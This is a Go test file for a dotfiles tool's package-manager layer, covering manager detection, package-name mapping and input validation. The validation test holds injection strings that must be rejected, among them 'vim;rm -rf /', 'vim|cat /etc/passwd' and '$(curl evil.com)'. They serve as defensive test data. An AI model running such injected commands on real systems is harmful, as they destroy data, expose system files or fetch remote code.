package platform

import (
	"runtime"
	"testing"

	"github.com/nvandessel/go4dot/internal/validation"
)

func TestGetPackageManager(t *testing.T) {
	tests := []struct {
		name     string
		platform *Platform
		wantName string
		wantErr  bool
	}{
		{
			name:     "DNF",
			platform: &Platform{PackageManager: "dnf"},
			wantName: "dnf",
			wantErr:  false,
		},
		{
			name:     "YUM",
			platform: &Platform{PackageManager: "yum"},
			wantName: "yum",
			wantErr:  false,
		},
		{
			name:     "APT",
			platform: &Platform{PackageManager: "apt"},
			wantName: "apt",
			wantErr:  false,
		},
		{
			name:     "Brew",
			platform: &Platform{PackageManager: "brew"},
			wantName: "brew",
			wantErr:  false,
		},
		{
			name:     "Pacman",
			platform: &Platform{PackageManager: "pacman"},
			wantName: "pacman",
			wantErr:  false,
		},
		{
			name:     "Unsupported",
			platform: &Platform{PackageManager: "unsupported"},
			wantName: "",
			wantErr:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			mgr, err := GetPackageManager(tt.platform)

			if tt.wantErr {
				if err == nil {
					t.Error("GetPackageManager() expected error, got nil")
				}
				return
			}

			if err != nil {
				t.Errorf("GetPackageManager() unexpected error: %v", err)
				return
			}

			if mgr.Name() != tt.wantName {
				t.Errorf("GetPackageManager() name = %s, want %s", mgr.Name(), tt.wantName)
			}
		})
	}
}

func TestMapPackageName(t *testing.T) {
	tests := []struct {
		name        string
		genericName string
		manager     string
		want        string
	}{
		{"neovim on dnf", "neovim", "dnf", "neovim"},
		{"neovim on apt", "neovim", "apt", "neovim"},
		{"neovim on brew", "neovim", "brew", "neovim"},
		{"fd on dnf", "fd", "dnf", "fd-find"},
		{"fd on apt", "fd", "apt", "fd-find"},
		{"fd on brew", "fd", "brew", "fd"},
		{"unmapped package", "some-random-pkg", "dnf", "some-random-pkg"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := MapPackageName(tt.genericName, tt.manager)
			if got != tt.want {
				t.Errorf("MapPackageName() = %s, want %s", got, tt.want)
			}
		})
	}
}

func TestPackageNameValidation(t *testing.T) {
	tests := []struct {
		name    string
		pkg     string
		wantErr bool
	}{
		{name: "valid package", pkg: "vim", wantErr: false},
		{name: "valid with hyphen", pkg: "gcc-c++", wantErr: false},
		{name: "valid with dot", pkg: "python3.11", wantErr: false},
		{name: "valid scoped", pkg: "@scope/package", wantErr: false},
		{name: "flag injection single dash", pkg: "-y", wantErr: true},
		{name: "flag injection double dash", pkg: "--install-suggests", wantErr: true},
		{name: "double dash flag", pkg: "--force-yes", wantErr: true},
		{name: "shell metachar semicolon", pkg: "vim;rm -rf /", wantErr: true},
		{name: "shell metachar pipe", pkg: "vim|cat /etc/passwd", wantErr: true},
		{name: "backtick injection", pkg: "`whoami`", wantErr: true},
		{name: "subshell injection", pkg: "$(curl evil.com)", wantErr: true},
		{name: "empty string", pkg: "", wantErr: true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validation.ValidatePackageName(tt.pkg)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePackageName(%q) error = %v, wantErr %v", tt.pkg, err, tt.wantErr)
			}
		})
	}
}

func TestDNFManager(t *testing.T) {
	mgr := &DNFManager{}

	if mgr.Name() != "dnf" {
		t.Errorf("Name() = %s, want dnf", mgr.Name())
	}

	if !mgr.NeedsSudo() {
		t.Error("NeedsSudo() should return true for DNF")
	}

	// IsAvailable depends on system state
	_ = mgr.IsAvailable()
}

func TestYumManager(t *testing.T) {
	mgr := &YumManager{}

	if mgr.Name() != "yum" {
		t.Errorf("Name() = %s, want yum", mgr.Name())
	}

	if !mgr.NeedsSudo() {
		t.Error("NeedsSudo() should return true for YUM")
	}
}

func TestAPTManager(t *testing.T) {
	mgr := &APTManager{}

	if mgr.Name() != "apt" {
		t.Errorf("Name() = %s, want apt", mgr.Name())
	}

	if !mgr.NeedsSudo() {
		t.Error("NeedsSudo() should return true for APT")
	}
}

func TestBrewManager(t *testing.T) {
	mgr := &BrewManager{}

	if mgr.Name() != "brew" {
		t.Errorf("Name() = %s, want brew", mgr.Name())
	}

	if mgr.NeedsSudo() {
		t.Error("NeedsSudo() should return false for Brew")
	}
}

func TestPacmanManager(t *testing.T) {
	mgr := &PacmanManager{}

	if mgr.Name() != "pacman" {
		t.Errorf("Name() = %s, want pacman", mgr.Name())
	}

	if !mgr.NeedsSudo() {
		t.Error("NeedsSudo() should return true for Pacman")
	}
}

func TestCommandExists(t *testing.T) {
	// Test with a command that should exist on all systems
	if !commandExists("sh") {
		t.Error("commandExists('sh') should return true")
	}

	// Test with a command that shouldn't exist
	if commandExists("this-command-definitely-does-not-exist-12345") {
		t.Error("commandExists() should return false for non-existent command")
	}
}

// Integration test for real package manager on current system
func TestRealPackageManager(t *testing.T) {
	// Only run if we can detect platform
	p, err := Detect()
	if err != nil {
		t.Skip("Cannot detect platform, skipping integration test")
	}

	if p.PackageManager == "unknown" || p.PackageManager == "none" {
		t.Skip("No package manager detected, skipping integration test")
	}

	mgr, err := GetPackageManager(p)
	if err != nil {
		t.Fatalf("GetPackageManager() failed: %v", err)
	}

	t.Logf("Testing with %s package manager", mgr.Name())

	// Test IsAvailable
	if !mgr.IsAvailable() {
		t.Errorf("%s should be available on this system", mgr.Name())
	}

	// Test IsInstalled with a package that's likely to be installed
	var testPkg string
	switch runtime.GOOS {
	case "linux":
		testPkg = "bash"
	case "darwin":
		testPkg = "bash" // bash is installed on macOS
	}

	if testPkg != "" {
		installed := mgr.IsInstalled(testPkg)
		t.Logf("Package %s installed: %v", testPkg, installed)
	}
}
